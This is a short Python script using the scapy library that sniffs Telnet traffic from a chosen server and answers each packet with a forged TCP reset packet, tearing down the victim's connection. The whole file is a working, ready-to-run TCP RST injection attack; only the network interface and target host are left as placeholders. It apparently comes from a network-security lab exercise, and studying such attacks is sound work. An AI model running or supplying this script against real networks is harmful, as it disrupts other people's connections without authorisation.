#!/usr/bin/python3
from scapy.all import *

def spoof_tcp(pkt):
    ip = IP(
            dst=pkt[IP].src,
            src=pkt[IP].dst
            )
    tcp = TCP(
            flags="R",
            seq=pkt[TCP].ack,
            dport=pkt[TCP].sport,
            sport=pkt[TCP].dport
            )
    spoofed_pkt = ip/tcp
    print("* Constructing the spoofed packet ...")
    spoofed_pkt.show()
    print("* Sending the RST packet ...")
    send(spoofed_pkt, verbose=0)

if __name__ == "__main__":
    interface = 'YOUR NETWORK INTERFACE'
    server_ip = 'SOURCE HOST'
    print("* Sniffing Packets ...")
    packet = sniff(
            iface=interface,
            filter=f'tcp port 23 and src host {server_ip}', # TCP port 23 is Telnet
            prn=spoof_tcp
            )
